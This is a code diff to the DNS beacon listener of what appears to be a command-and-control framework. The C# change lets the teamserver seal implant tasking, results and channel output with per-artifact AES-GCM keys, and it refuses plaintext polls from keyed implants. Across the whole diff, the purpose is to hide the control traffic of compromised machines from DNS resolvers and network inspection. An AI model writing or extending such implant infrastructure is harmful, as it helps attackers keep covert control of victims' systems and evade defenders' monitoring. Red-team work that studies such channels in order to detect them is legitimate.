@@ -40,6 +40,17 @@ namespace Rod.Transport.Listeners.Dns;
 // the EnrollResponse chunks back down as a.-answers under a token. An
 // accepted DNS enrollment opens the session itself (no handshake exists to
 // open it): the polls that follow refresh what it wrote.
+//
+// Sealing beyond the enroll exchange (the check-in carriage's own): an
+// artifact whose build baked an envelope key polls k.-named (the key id in
+// the name, so the answer seals statelessly -- no in-memory pairing needs to
+// survive a restart for the ciphertext to resume), its tasking and parked
+// input answers ride as raw R1 bodies under DnsPollAad, and its results and
+// channel outputs reassemble into sealed blobs under their own purpose tags.
+// The resolver chain reads no frame bytes in the clear for a keyed artifact;
+// the signature (not the seal) remains the authority on execution, so the
+// documented tradeoffs -- identity by implant id, spoofable presence -- are
+// unchanged, while tasking disclosure and output disclosure close.
 
 /// <summary>
 /// Serves enroll, poll, and result check-ins for one teamserver. Singleton:
@@ -313,9 +324,48 @@ internal sealed class DnsBeaconBridge
     /// store-and-forward channel the session advertised -- or null when
     /// there is nothing to send (no live session, empty queue and empty
     /// park, a task too large for the DNS budget; the last is requeued for
-    /// a stream transport).
+    /// a stream transport). The plaintext carriage: an implant bound to an
+    /// envelope key at enrollment is refused here outright (an empty answer,
+    /// no presence credit) -- its tasking is never handed down in the clear,
+    /// so a plain p-poll cannot downgrade a sealed artifact's channel.
     /// </summary>
-    public async Task<byte[]?> PollAsync(ImplantId implant, CancellationToken cancellationToken)
+    public Task<byte[]?> PollAsync(ImplantId implant, CancellationToken cancellationToken)
+    {
+        if (_checkInKeys.TryGet(implant) is not null)
+            return Task.FromResult<byte[]?>(null);
+        return BuildPollPayloadAsync(implant, cancellationToken);
+    }
+
+    /// <summary>
+    /// One key-named poll (the sealed carriage): the key id the name carries
+    /// resolves the artifact key statelessly -- the payload store is durable,
+    /// so a teamserver restart loses nothing a k-poll does not re-derive (the
+    /// resolved key re-binds the in-memory pairing the p-path's refusal
+    /// reads). The answer payload seals under that key (DnsPollAad): tasking
+    /// and parked input alike cross the resolver chain as ciphertext. A key
+    /// id that resolves to nothing (the payload was deleted) falls back to
+    /// the plaintext answer -- the artifact's envelopes are undecodable by
+    /// then anyway, and silence would strand an implant that can still
+    /// presence.
+    /// </summary>
+    public async Task<byte[]?> PollAsync(ImplantId implant, Guid keyId, CancellationToken cancellationToken)
+    {
+        var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
+        if (carrier?.EnvelopeKey is not { } key)
+            return await BuildPollPayloadAsync(implant, cancellationToken);
+        _checkInKeys.Bind(implant, keyId, key);
+        var payload = await BuildPollPayloadAsync(implant, cancellationToken);
+        return payload is null
+            ? null
+            : AesGcmEnvelope.WrapBody(payload, keyId, key, AesGcmEnvelope.DnsPollAad);
+    }
+
+    /// <summary>
+    /// The poll payload both carriages share: presence, the next claimable
+    /// tasking, or the parked channel input -- the composition the poll
+    /// always ran, carriage-agnostic.
+    /// </summary>
+    private async Task<byte[]?> BuildPollPayloadAsync(ImplantId implant, CancellationToken cancellationToken)
     {
         // DNS carries no handshake: presence only refreshes a session another
         // transport opened (or the DNS enrollment itself, which opens one).
@@ -443,10 +493,19 @@ internal sealed class DnsBeaconBridge
         if (output is null)
             return;
 
+        // The sealed carriage unseals here: a sealed blob resolves its own
+        // key and must verify; a plaintext blob survives only for an implant
+        // no enrollment bound to a key (the upstream half of the downgrade
+        // refusal the p-path applies).
+        var unsealed = await TryUnsealUplinkAsync(
+            implant, output, AesGcmEnvelope.DnsResultAad.ToArray(), cancellationToken);
+        if (unsealed is null)
+            return;
+
         TaskCompleted completed;
         try
         {
-            completed = await _tasks.RecordResultAsync(task, System.Text.Encoding.UTF8.GetString(output), outcome, cancellationToken);
+            completed = await _tasks.RecordResultAsync(task, System.Text.Encoding.UTF8.GetString(unsealed), outcome, cancellationToken);
         }
         catch (InvalidOperationException)
         {
@@ -512,13 +571,20 @@ internal sealed class DnsBeaconBridge
         if (message is null)
             return;
 
+        // The sealed carriage unseals here, the result path's own rule under
+        // the channel's purpose tag.
+        var data = await TryUnsealUplinkAsync(
+            implant, message, AesGcmEnvelope.DnsChannelAad.ToArray(), cancellationToken);
+        if (data is null)
+            return;
+
         // The reassembled bytes are the channel's DATA (the name carries the
         // task id), so the message is built here rather than parsed -- the
         // client chunks the data field, not a marshaled message.
         var output = new Rod.V1.ChannelOutput
         {
             TaskId = task.ToString(),
-            Data = Google.Protobuf.ByteString.CopyFrom(message),
+            Data = Google.Protobuf.ByteString.CopyFrom(data),
         };
         var context = new BeaconSessionContext(
             implant,
@@ -532,5 +598,28 @@ internal sealed class DnsBeaconBridge
             stagedPullSink: static _ => { },
             taskAckSink: static _ => { },
             cancellationToken);
+    }
+
+    /// <summary>
+    /// The upstream unseal both reassembly paths share: a sealed blob (the
+    /// raw R1 shape) resolves its own key off the payload store and must
+    /// verify under the path's purpose tag, or the whole reassembly drops;
+    /// a plaintext blob is tolerated only for an implant no enrollment
+    /// bound to a key -- the DNS tradeoff's documented plaintext shape.
+    /// </summary>
+    private async Task<byte[]?> TryUnsealUplinkAsync(
+        ImplantId implant,
+        byte[] blob,
+        byte[] aad,
+        CancellationToken cancellationToken)
+    {
+        if (AesGcmEnvelope.TryReadKeyIdBody(blob) is { } keyId)
+        {
+            var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
+            if (carrier?.EnvelopeKey is not { } key)
+                return null;
+            return AesGcmEnvelope.TryUnwrapBody(blob, keyId, key, aad);
+        }
+        return _checkInKeys.TryGet(implant) is null ? blob : null;
     }
 }
